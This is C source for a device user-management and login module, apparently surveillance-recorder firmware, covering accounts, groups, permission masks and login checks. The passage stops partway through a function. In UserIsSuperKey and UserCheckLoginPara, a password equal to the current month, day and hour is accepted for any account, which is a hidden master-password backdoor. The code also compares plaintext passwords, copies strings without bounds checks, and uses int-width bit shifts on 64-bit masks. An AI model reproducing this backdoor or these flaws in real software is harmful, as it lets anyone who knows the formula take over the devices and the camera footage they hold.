#include "mod_common.h"
#include "mod_user.h"
#include "user.h"

s32 UserGetAuthority(SModUserManager* manager, u8* name, SModUserAuthority* author)
{
	if((NULL == manager) || (NULL == name) || (NULL == author))
	{
		return -1;
	}
	
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if(((manager->para.nFlagUserSetted[i/64] >> (i%64)) & 1) 
			&& (0 == strcasecmp(manager->para.UserPara[i].UserName, name)))
		{
			memcpy(author, &manager->para.UserPara[i].UserAuthor, sizeof(SModUserAuthority));
			return 0;
		}
	}
	return -1;
}

s32 UserLogoutUserWithId(SModUserLoginedInfo** pLoginInfo, u32 id)
{
	if((NULL == pLoginInfo) || (NULL == *pLoginInfo))
	{
		return -1;
	}
	
	SModUserLoginedInfo* pInfo = *pLoginInfo;
	if(pInfo->id == id)
	{
		*pLoginInfo = pInfo->pNext;
		free(pInfo);
		printf("delete-1 user login info\n");
	}
	else
	{
		SModUserLoginedInfo* info = *pLoginInfo;
		SModUserLoginedInfo* tmp = info->pNext;
		while(tmp)
		{
			if(tmp->id == id)
			{
				info->pNext = tmp->pNext;
				free(tmp);
				printf("delete-2 user login info\n");
				break;
			}
			info = tmp;
			tmp = tmp->pNext;
		}
	}
	
	return 0;
}

u8* UserGetNameFromId(SModUserLoginedInfo* pLoginInfo, u32 id)
{
	static SModUserLoginedInfo* info = NULL;
	if(pLoginInfo)
	{
		info = pLoginInfo;
		while(info)
		{
			if(info->id == id)
			{
				return info->UserName;
			}
			info = info->pNext;
		}
	}
	return NULL;
}

s32 UserIsSuperKey(u8* key)
{
	if(NULL == key)
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	time_t t = time(NULL);
	
	//csp modify
	//struct tm* now = localtime(&t);
	struct tm tm0;
	struct tm* now = &tm0;
	localtime_r(&t, now);
	
	u8 super[20];
	memset(super, 0, sizeof(super));
	sprintf(super, "%02d%02d%02d", now->tm_mon + 1, now->tm_mday, now->tm_hour);
	if(0 == strcmp(key, super))
	{
		printf("I am super user!\n");
		return 0;
	}
	
	return -1;
}

s32 UserCheckLoginIp(SModUserManager* manager, SModUserLoginPara* para)
{
	if((NULL == manager) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	if((para->emFrom == EM_MODUSER_LOGINFROM_GUI) || (manager->sBlackWhiteList.emBlackOrWhite == EM_MODUSER_NONELIST))
	{
		return 0;
	}
	if(manager->sBlackWhiteList.emBlackOrWhite == EM_MODUSER_WHITELIST)
	{
		s32 i = 0;
		for(i = 0; i < sizeof(manager->sBlackWhiteList.sList) / sizeof(SModUserIpSeg); i++)
		{
			if((para->nPcIp >= manager->sBlackWhiteList.sList[i].nFirstIp) && (para->nPcIp <= manager->sBlackWhiteList.sList[i].nLastIp))
			{
				return 0;
			}
		}
		return -1;
	}
	if(manager->sBlackWhiteList.emBlackOrWhite == EM_MODUSER_BLACKLIST)
	{
		s32 i = 0;
		for(i = 0; i < sizeof(manager->sBlackWhiteList.sList) / sizeof(SModUserIpSeg); i++)
		{
			if((para->nPcIp >= manager->sBlackWhiteList.sList[i].nFirstIp) && (para->nPcIp <= manager->sBlackWhiteList.sList[i].nLastIp))
			{
				return -1;
			}
		}
		return 0;
	}
	return -1;
}

s32 UserCheckLoginMac(SModUserUserPara* pUserPara, SModUserLoginPara* para)
{
	if((NULL == pUserPara) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	if((para->emFrom == EM_MODUSER_LOGINFROM_GUI) || (pUserPara->emIsBindPcMac == EM_MODUSER_BIND_PCMAC_NO))
	{
		return 0;
	}
	
	printf("UserCheckLoginMac %d %llx %llx\n", pUserPara->emIsBindPcMac, pUserPara->PcMacAddress, para->nPcMac);
			
	if((pUserPara->emIsBindPcMac == EM_MODUSER_BIND_PCMAC_YES) && (pUserPara->PcMacAddress == para->nPcMac))
	{
		return 0;
	}
	return -1;
}

s32 UserCheckLoginWebPermit(SModUserUserPara* pUserPara, SModUserLoginPara* para)
{
	if((NULL == pUserPara) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	if(para->emFrom == EM_MODUSER_LOGINFROM_GUI)
	{
		return 0;
	}
	
	if(pUserPara->UserAuthor.nAuthor[EM_MOD_USER_AUTHOR_REMOTE_LOGIN])
	{
		return 0;
	}
	return -1;
}

s32 UserCheckLoginTwince(SModUserManager* manager, SModUserUserPara* pUserPara)
{
	if((NULL == manager) || (NULL == pUserPara))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	if(pUserPara->emLoginTwince == EM_MODUSER_LOGINTWINCE_YES)
	{
		return 0;
	}
	if(pUserPara->emLoginTwince == EM_MODUSER_LOGINTWINCE_NO)
	{
		SModUserLoginedInfo* info = manager->pUserLogined;
		while(info)
		{
			if(0 == strcasecmp(info->UserName, pUserPara->UserName))
			{
				return -1;
			}
			info = info->pNext;
		}
		return 0;
	}
	
	return -1;
}

s32 UserCheckLoginPara(SModUserManager* manager, SModUserLoginPara* para)
{
	if((NULL == manager) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	static u16 NewId = 1;
	
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if(((manager->para.nFlagUserSetted[i/64] >> (i%64)) & 1) && (0 == strcasecmp(manager->para.UserPara[i].UserName, para->UserName)))
		{
			if((0 == strcmp(manager->para.UserPara[i].Password, para->Password)) || (0 == UserIsSuperKey(para->Password)))
			{
				if(0 != UserCheckLoginTwince(manager, &manager->para.UserPara[i]))
				{
					printf("Login failed! The user has logined, it is not allowed to login twince\n");
					return EM_MODUSER_LOGIN_ERR_NOLOGINTWINCE;
				}				
				if(0 != UserCheckLoginIp(manager, para))
				{
					printf("Login failed! The PC IP is not allowed to login.\n");
					return EM_MODUSER_LOGIN_ERR_IP_NOPERMIT;
				}				
				if(0 != UserCheckLoginMac(&manager->para.UserPara[i], para))
				{
					printf("Login failed! The PC MAC is not allowed to login.\n");
					return EM_MODUSER_LOGIN_ERR_MAC_NOPERMIT;
				}
				if(0 != UserCheckLoginWebPermit(&manager->para.UserPara[i], para))
				{
					printf("Login failed! The user is not allowed to login remote.\n");
					return EM_MODUSER_LOGIN_ERR_NO_PERMIT_WEB_LOGIN;
				}
				
				SModUserLoginedInfo* info = (SModUserLoginedInfo*)calloc(sizeof(SModUserLoginedInfo), 1);
				printf("new user login info\n");
				strcpy(info->UserName, para->UserName);
				while(UserGetNameFromId(manager->pUserLogined, NewId))
				{
					NewId++;
					if(NewId == 0xffff)
					{
						NewId = 1;
					}
				}
				info->id = NewId++;
				//csp modify
				if(NewId == 0xffff)
				{
					NewId = 1;
				}
				info->IsLocked = 0;
				info->emFrom = para->emFrom;
				info->nPcIp = para->nPcIp;
				info->pNext = NULL;
				if(manager->pUserLogined == NULL)
				{
					manager->pUserLogined = info;
				}
				else
				{
					SModUserLoginedInfo* tmp = manager->pUserLogined;
					while(manager->pUserLogined->pNext != NULL)
					{
						manager->pUserLogined = manager->pUserLogined->pNext;
					}
					manager->pUserLogined->pNext = info;
					manager->pUserLogined = tmp;
				}
				manager->nLoginedUserNum++;
				return (s32)info->id;
			}
			else
			{
				printf("Password error!\n");
				return EM_MODUSER_LOGIN_ERR_WRONGPASSWD;
			}
		}
	}
	
	printf("No this user!\n");
	
	return EM_MODUSER_LOGIN_ERR_NOTHISUSER;
}

/**********************************以下是提供给业务层的接口实现***************************/
UserCenter ModUserInit(SModUserPara* para)
{
	if(NULL == para)
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return NULL;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)malloc(sizeof(SModUserManager));
	if(NULL == sUserManager)
	{
		fprintf(stderr, "malloc error! function:%s\n", __FUNCTION__);
		return NULL;
	}
	
	memset(sUserManager, 0, sizeof(SModUserManager));
	
	if(0 != sem_init(&sUserManager->sem, 0, 1))
	{
		fprintf(stderr, "sem_init error! function:%s\n", __FUNCTION__);
		free(sUserManager);
		return NULL;
	}
	
	memcpy(&sUserManager->para, para, sizeof(SModUserPara));
	//printf("nFlagUserSetted[0] = %08x, [1] = %08x\n", sUserManager->para.nFlagUserSetted[0],sUserManager->para.nFlagUserSetted[1]);
	
	sUserManager->nLoginedUserNum = 0;
	sUserManager->pUserLogined = NULL;
	
	return (UserCenter)sUserManager;
}

s32 ModUserDeinit(UserCenter pCenter)
{
	if(NULL == pCenter)
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	SModUserLoginedInfo* sUserLoginedInfo = sUserManager->pUserLogined;
	while(sUserLoginedInfo != NULL)
	{
		sUserLoginedInfo = sUserLoginedInfo->pNext;
		free(sUserManager->pUserLogined);
		sUserManager->pUserLogined = sUserLoginedInfo;
	}
	free(sUserManager);
	sUserManager = NULL;
	pCenter = NULL;
	return 0;
}

s32 ModUserLogin(UserCenter pCenter, SModUserLoginPara* para, u32* nUserId)
{
	printf("ModUserLogin start\n");
	
	if((NULL == pCenter) || (NULL == para) || (NULL == nUserId))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	
	sem_wait(&sUserManager->sem);
	
	s32 ret = UserCheckLoginPara(sUserManager, para);
	if(ret < 0)
	{
		fprintf(stderr, "UserCheckLoginPara failed! function:%s\n", __FUNCTION__);
		sem_post(&sUserManager->sem);
		return ret;
	}
	*nUserId = ret;
	printf("Login user ID[%d]\n", *nUserId);
	
	sem_post(&sUserManager->sem);
	
	return 0;
}

s32 ModUserLogout(UserCenter pCenter, u32 nUserId)
{
	printf("Logout user ID[%d]\n", nUserId);
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	if((NULL == pCenter) || (NULL == UserGetNameFromId(sUserManager->pUserLogined, nUserId)))
	{
		//add by Lirl on Nov/22/2011,ż��admin�û��޷�����
		printf("***pCenter:%d, nUserId:%u\n\n", pCenter?1:0, nUserId);
		//end
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	sem_wait(&sUserManager->sem);
	
	if(0 != UserLogoutUserWithId(&sUserManager->pUserLogined, nUserId))
	{
		fprintf(stderr, "UserLogoutUserWithId error! function:%s\n", __FUNCTION__);
		sem_post(&sUserManager->sem);
		return -1;
	}
	sUserManager->nLoginedUserNum--;
	
	sem_post(&sUserManager->sem);
	
	return 0;
}

EMMODUSERIFAUTHOR ModUserCheckAuthor(UserCenter pCenter, EMMODUSEROPERATE emOperation, u32* para, u32 nUserId)
{
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	
	if((NULL == pCenter) || (NULL == UserGetNameFromId(sUserManager->pUserLogined, nUserId))		
		|| ((emOperation >= EM_MOD_USER_AUTHOR_LIVEVIEW) && (emOperation < EM_MOD_USER_AUTHOR_NULL) && (NULL == para)))		
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return EM_MODUSER_AUTHOR_ERROR;
	}
	
	sem_wait(&sUserManager->sem);
	
	u8* name = UserGetNameFromId(sUserManager->pUserLogined, nUserId);
	SModUserAuthority author;
	if(0 != UserGetAuthority(sUserManager, name ,&author))
	{
		fprintf(stderr, "UserGetAuthority error! function:%s\n", __FUNCTION__);
		sem_post(&sUserManager->sem);
		return EM_MODUSER_AUTHOR_ERROR;
	}
	
	EMMODUSERIFAUTHOR ret = EM_MODUSER_AUTHOR_NO;
	if(emOperation < EM_MOD_USER_AUTHOR_LIVEVIEW)
	{
		if(author.nAuthor[emOperation])
		{
			ret = EM_MODUSER_AUTHOR_YES;
		}
	}
	else if((emOperation >= EM_MOD_USER_AUTHOR_LIVEVIEW) && (emOperation < EM_MOD_USER_AUTHOR_NULL) && (NULL != para))
	{
		u32 flag = *para;
		flag &= 0xff;
		if(author.nAuthor[emOperation])
		{
			u64 mask = 0;
			switch(emOperation)
			{
				case EM_MOD_USER_AUTHOR_LIVEVIEW:
					mask = author.nLiveView[flag / 64];
					break;
					
				case EM_MOD_USER_AUTHOR_REMOTEVIEW:
					mask = author.nRemoteView[flag / 64];
					break;
					
				case EM_MOD_USER_AUTHOR_RECORD:
					mask = author.nRecord[flag / 64];
					break;
					
				case EM_MOD_USER_AUTHOR_PLAYBACK:
					mask = author.nPlayback[flag / 64];
					break;
					
				case EM_MOD_USER_AUTHOR_RECFILE_BACKUP:
					mask = author.nBackUp[flag / 64];
					break;
					
				case EM_MOD_USER_AUTHOR_PTZCTRL:
					mask = author.nPtzCtrl[flag / 64];
					break;
					
				default:
					break;
			}
			if(mask & (1 << (flag % 64)))
			{
				ret = EM_MODUSER_AUTHOR_YES;
			}
		}
	}
	
	sem_post(&sUserManager->sem);
	return ret;
}

s32 ModUserAddGroup(UserCenter pCenter, SModUserGroupPara* para)
{
	if((NULL == pCenter) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	if((strcmp(para->GroupName, "") == 0) || (strcasecmp(para->GroupName, "None") == 0))
	{
		printf("[None] can not been used as group name!\n");
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_GROUP_NUM; i++)
	{
		if(((sUserManager->para.nFlagGroupSetted >> i) & 1)
			&& (strcasecmp(sUserManager->para.GroupPara[i].GroupName, para->GroupName) == 0))
		{
			printf("This group name [%s] has been used!\n", para->GroupName);
			sem_post(&sUserManager->sem);
			return -1;
		}
	}
	for(i = 0; i < MOD_USER_MAX_GROUP_NUM; i++)
	{
		if(((sUserManager->para.nFlagGroupSetted >> i) & 1) == 0)
		{
			memcpy(&sUserManager->para.GroupPara[i], para, sizeof(SModUserGroupPara));
			sUserManager->para.nFlagGroupSetted |= (1 << i);
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("Group number has been to the maxinum, Add new group error! function:%s\n", __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return -1;
}

s32 ModUserModifyGroup(UserCenter pCenter, SModUserGroupPara* para)
{
	if((NULL == pCenter) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	if(strcasecmp(para->GroupName, "Administrator") == 0)
	{
		printf("Group [Administrator] can not been modified!\n");
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_GROUP_NUM; i++)
	{
		if(((sUserManager->para.nFlagGroupSetted >> i) & 1)
			&& (strcasecmp(sUserManager->para.GroupPara[i].GroupName, para->GroupName) == 0))
		{
			u8 j, k, m;
			if(sUserManager->para.GroupPara[i].nDoWithUser)
			{
				for(j = 0; j < MOD_USER_MAX_USER_NUM; j++)
				{
					if(((sUserManager->para.nFlagUserSetted[j/64] >> (j%64)) & 1)
						&& (strcasecmp(sUserManager->para.UserPara[j].GroupBelong, para->GroupName) == 0))
					{
						for(k = 0; k < 64; k++)
						{
							if((para->GroupAuthor.nAuthor[k]) && (0 == sUserManager->para.GroupPara[i].GroupAuthor.nAuthor[k]) && (0 == sUserManager->para.UserPara[j].UserAuthor.nAuthor[k]))
							{
								sUserManager->para.UserPara[j].UserAuthor.nAuthor[k] = 1;
							}
							else if((para->GroupAuthor.nAuthor[k] == 0) && (sUserManager->para.GroupPara[i].GroupAuthor.nAuthor[k]) && (sUserManager->para.UserPara[j].UserAuthor.nAuthor[k]))
							{
								sUserManager->para.UserPara[j].UserAuthor.nAuthor[k] = 0;
							}
						}
						for(m = 0; m < 4; m++)
						{
							u64 tmp = 0;
							tmp = ((para->GroupAuthor.nLiveView[m]) ^ (sUserManager->para.GroupPara[i].GroupAuthor.nLiveView[m]));
							if(tmp)
							{
								for(k = 0; k < 64; k++)
								{
									if((tmp >> k) & 1)
									{
										if((para->GroupAuthor.nLiveView[m] >> k) & 1)
										{
											sUserManager->para.UserPara[j].UserAuthor.nLiveView[m] |= (1 << k);
										}
										else
										{
											sUserManager->para.UserPara[j].UserAuthor.nLiveView[m] &= (~(1 << k));
										}
									}
								}
							}
						}
						for(m = 0; m < 4; m++)
						{
							u64 tmp = 0;
							tmp = ((para->GroupAuthor.nRemoteView[m]) ^ (sUserManager->para.GroupPara[i].GroupAuthor.nRemoteView[m]));
							if(tmp)
							{
								for(k = 0; k < 64; k++)
								{
									if((tmp >> k) & 1)
									{
										if((para->GroupAuthor.nRemoteView[m] >> k) & 1)
										{
											sUserManager->para.UserPara[j].UserAuthor.nRemoteView[m] |= (1 << k);
										}
										else
										{
											sUserManager->para.UserPara[j].UserAuthor.nRemoteView[m] &= (~(1 << k));
										}
									}
								}
							}
						}
						for(m = 0; m < 4; m++)
						{
							u64 tmp = 0;
							tmp = ((para->GroupAuthor.nRecord[m]) ^ (sUserManager->para.GroupPara[i].GroupAuthor.nRecord[m]));
							if(tmp)
							{
								for(k = 0; k < 64; k++)
								{
									if((tmp >> k) & 1)
									{
										if((para->GroupAuthor.nRecord[m] >> k) & 1)
										{
											sUserManager->para.UserPara[j].UserAuthor.nRecord[m] |= (1 << k);
										}
										else
										{
											sUserManager->para.UserPara[j].UserAuthor.nRecord[m] &= (~(1 << k));
										}
									}
								}
							}
						}
						for(m = 0; m < 4; m++)
						{
							u64 tmp = 0;
							tmp = ((para->GroupAuthor.nPlayback[m]) ^ (sUserManager->para.GroupPara[i].GroupAuthor.nPlayback[m]));
							if(tmp)
							{
								for(k = 0; k < 64; k++)
								{
									if((tmp >> k) & 1)
									{
										if((para->GroupAuthor.nPlayback[m] >> k) & 1)
										{
											sUserManager->para.UserPara[j].UserAuthor.nPlayback[m] |= (1 << k);
										}
										else
										{
											sUserManager->para.UserPara[j].UserAuthor.nPlayback[m] &= (~(1 << k));
										}
									}
								}
							}
						}
						for(m = 0; m < 4; m++)
						{
							u64 tmp = 0;
							tmp = ((para->GroupAuthor.nBackUp[m]) ^ (sUserManager->para.GroupPara[i].GroupAuthor.nBackUp[m]));
							if(tmp)
							{
								for(k = 0; k < 64; k++)
								{
									if((tmp >> k) & 1)
									{
										if((para->GroupAuthor.nBackUp[m] >> k) & 1)
										{
											sUserManager->para.UserPara[j].UserAuthor.nBackUp[m] |= (1 << k);
										}
										else
										{
											sUserManager->para.UserPara[j].UserAuthor.nBackUp[m] &= (~(1 << k));
										}
									}
								}
							}
						}
						for(m = 0; m < 4; m++)
						{
							u64 tmp = 0;
							tmp = ((para->GroupAuthor.nPtzCtrl[m]) ^ (sUserManager->para.GroupPara[i].GroupAuthor.nPtzCtrl[m]));
							if(tmp)
							{
								for(k = 0; k < 64; k++)
								{
									if((tmp >> k) & 1)
									{
										if((para->GroupAuthor.nPtzCtrl[m] >> k) & 1)
										{
											sUserManager->para.UserPara[j].UserAuthor.nPtzCtrl[m] |= (1 << k);
										}
										else
										{
											sUserManager->para.UserPara[j].UserAuthor.nPtzCtrl[m] &= (~(1 << k));
										}
									}
								}
							}
						}
					}
				}
			}
			
			memcpy(&sUserManager->para.GroupPara[i], para, sizeof(SModUserGroupPara));
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("System cannot find group named [%s], modify group error! function:%s\n", para->GroupName, __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return -1;
}

s32 ModUserDeleteGroup(UserCenter pCenter, s8* pGroupName)
{
	if((NULL == pCenter) || (NULL == pGroupName))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	if(strcasecmp(pGroupName, "Administrator") == 0)
	{
		printf("Group [Administrator] can not been deleted!\n");
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_GROUP_NUM; i++)
	{
		if(((sUserManager->para.nFlagGroupSetted >> i) & 1)
			&& (strcasecmp(sUserManager->para.GroupPara[i].GroupName, pGroupName) == 0))
		{
			if(0 == sUserManager->para.GroupPara[i].nDoWithUser)
			{
				s32 j = 0;
				for(j = 0; j < MOD_USER_MAX_USER_NUM; j++)
				{
					if(((sUserManager->para.nFlagUserSetted[j/64] >> (j%64)) & 1)
						&& (strcasecmp(sUserManager->para.UserPara[j].GroupBelong, pGroupName) == 0))
					{
						strcpy(sUserManager->para.UserPara[j].GroupBelong, "None");
					}
				}
			}
			else
			{
				s32 j = 0;
				SModUserLoginedInfo* info = NULL;
				for(j = 0; j < MOD_USER_MAX_USER_NUM; j++)
				{
					if(((sUserManager->para.nFlagUserSetted[j/64] >> (j%64)) & 1)
						&& (strcasecmp(sUserManager->para.UserPara[j].GroupBelong, pGroupName) == 0))
					{
						info = sUserManager->pUserLogined;
						while(info)
						{
							if(strcasecmp(sUserManager->para.UserPara[j].UserName, info->UserName) == 0)
							{
								printf("some user belong this group is logined, try again after logout the user!\n");
								sem_post(&sUserManager->sem);
								return -1;
							}
							info = info->pNext;
						}
					}
				}
				for(j = 0; j < MOD_USER_MAX_USER_NUM; j++)
				{
					if(((sUserManager->para.nFlagUserSetted[j/64] >> (j%64)) & 1)
						&& (strcasecmp(sUserManager->para.UserPara[j].GroupBelong, pGroupName) == 0))
					{
						sUserManager->para.nFlagUserSetted[j/64] &= ~(1 << (j%64));
						memset(&sUserManager->para.UserPara[j], 0, sizeof(SModUserUserPara));					
					}
				}
			}
			
			memset(&sUserManager->para.GroupPara[i], 0, sizeof(SModUserGroupPara));			
			sUserManager->para.nFlagGroupSetted &= ~(1 << i);
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("System cannot find group named [%s], delete group error! function:%s\n", pGroupName, __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return -1;
}

s32 ModUserGetGroupList(UserCenter pCenter, s8** list, s32* nLength, s32* nRealLength)
{
	if((NULL == pCenter) || (NULL == list) || (NULL == nLength) || (NULL == nRealLength))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	s32 num = 0;
	for(i = 0; i < MOD_USER_MAX_GROUP_NUM; i++)
	{
		if((sUserManager->para.nFlagGroupSetted >> i) & 1)
		{
			num++;
			if(num <= *nLength)
			{
				strcpy(list[num-1], sUserManager->para.GroupPara[i].GroupName);
				//memcpy(list[num-1], sUserManager->para.GroupPara[i].GroupName, strlen(sUserManager->para.GroupPara[i].GroupName));
			}
		}
	}
	*nRealLength = num;
	sem_post(&sUserManager->sem);
	
	return 0;
}

s32 ModUserGetGroupInfo(UserCenter pCenter, s8* pGroupName, SModUserGroupPara* para)
{
	if((NULL == pCenter) || (NULL == pGroupName) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_GROUP_NUM; i++)
	{
		if(((sUserManager->para.nFlagGroupSetted >> i) & 1)
			&& (strcasecmp(sUserManager->para.GroupPara[i].GroupName, pGroupName) == 0))
		{
			memcpy(para, &sUserManager->para.GroupPara[i], sizeof(SModUserGroupPara));
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("System cannot find group named [%s], get group info error! function:%s\n", pGroupName, __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return -1;
}

s32 ModUserAddUser(UserCenter pCenter, SModUserUserPara* para)
{
	if((NULL == pCenter) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	if(0 == strcmp("", para->UserName))
	{
		fprintf(stderr, "Invalid user name!\n");
		return EM_MODUSER_ADDUSER_INVALID_NAME;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if(((sUserManager->para.nFlagUserSetted[i/64] >> (i%64)) & 1)
			&& (strcasecmp(sUserManager->para.UserPara[i].UserName, para->UserName) == 0))
		{
			printf("This name [%s] is already exist!\n", para->UserName);
			sem_post(&sUserManager->sem);
			return EM_MODUSER_ADDUSER_EXIST_NAME;
		}
	}
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if(0 == ((sUserManager->para.nFlagUserSetted[i/64] >> (i%64)) & 1))
		{
			memcpy(&sUserManager->para.UserPara[i], para, sizeof(SModUserUserPara));
			sUserManager->para.nFlagUserSetted[i/64] |= (1 << (i%64));
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("User number has been to the maximum, Add new user error! function:%s\n", __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return EM_MODUSER_ADDUSER_TOMAXNUM;
}

s32 ModUserModifyUser(UserCenter pCenter, SModUserUserPara* para)
{
	if((NULL == pCenter) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
/*	if(strcasecmp(para->UserName, "admin") == 0)
	{
		printf("User [admin] can not been modified!\n");
		return -1;
	}
*/
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if(((sUserManager->para.nFlagUserSetted[i/64] >> (i%64)) & 1)
			&& (strcasecmp(sUserManager->para.UserPara[i].UserName, para->UserName) == 0))
		{
			memcpy(&sUserManager->para.UserPara[i], para, sizeof(SModUserUserPara));
			
			printf("is bind mac %d\n", para->emIsBindPcMac);
			
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("System cannot find user named [%s], modify user error! function:%s\n", para->UserName, __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return -1;
}

s32 ModUserDeleteUser(UserCenter pCenter, s8* pUserName)
{
	if((NULL == pCenter) || (NULL == pUserName))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	if(strcasecmp(pUserName, "admin") == 0)
	{
		printf("User [admin] can not been deleted!\n");
		return EM_MODUSER_DELUSER_INVALID_NAME;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if(((sUserManager->para.nFlagUserSetted[i/64] >> (i%64)) & 1)
			&& (strcasecmp(sUserManager->para.UserPara[i].UserName, pUserName) == 0))
		{
			SModUserLoginedInfo* info = sUserManager->pUserLogined;
			while(info)
			{
				if(strcasecmp(pUserName, info->UserName) == 0)
				{
					printf("User [%s] is logined, try again after logout the user!\n", pUserName);
					sem_post(&sUserManager->sem);
					return EM_MODUSER_DELUSER_USER_LOGINED;
				}
				info = info->pNext;
			}
			memset(&sUserManager->para.UserPara[i], 0, sizeof(SModUserUserPara));
			sUserManager->para.nFlagUserSetted[i/64] &= ~(1 << (i%64));
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("System cannot find user named [%s], delete user error! function:%s\n", pUserName, __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return -1;
}

s32 ModUserGetListUserRegisted(UserCenter pCenter, s8** list, s32* nLength, s32* nRealLength)
{
	if((NULL == pCenter) || (NULL == list) || (NULL == nLength) || (NULL == nRealLength))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	s32 num = 0;
	//printf("nFlagUserSetted[0] = %08x, [1] = %08x\n", sUserManager->para.nFlagUserSetted[0],sUserManager->para.nFlagUserSetted[1]);
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if((sUserManager->para.nFlagUserSetted[i/64] >> (i%64)) & 1)
		{
			num++;
			if(num <= *nLength)
			{
				strcpy(list[num-1], sUserManager->para.UserPara[i].UserName);
			}
		}
	}
	*nRealLength = num;
	sem_post(&sUserManager->sem);
	
	return 0;
}

s32 ModUserGetUserInfo(UserCenter pCenter, s8* pUserName, SModUserUserPara* para)
{
	if((NULL == pCenter) || (NULL == pUserName) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
	s32 i = 0;
	for(i = 0; i < MOD_USER_MAX_USER_NUM; i++)
	{
		if(((sUserManager->para.nFlagUserSetted[i/64] >> (i%64)) & 1)
			&& (strcasecmp(sUserManager->para.UserPara[i].UserName, pUserName) == 0))
		{
			memcpy(para, &sUserManager->para.UserPara[i], sizeof(SModUserUserPara));
			sem_post(&sUserManager->sem);
			return 0;
		}
	}
	printf("System cannot find user named [%s], get user info error! function:%s\n", pUserName, __FUNCTION__);
	sem_post(&sUserManager->sem);
	
	return -1;
}

s32 ModUserUpdatePara(UserCenter pCenter, SModUserPara* para)
{
	if((NULL == pCenter) || (NULL == para))
	{
		fprintf(stderr, "Invalid para! function:%s\n", __FUNCTION__);
		return -1;
	}
	
	SModUserManager* sUserManager = (SModUserManager*)pCenter;
	sem_wait(&sUserManager->sem);
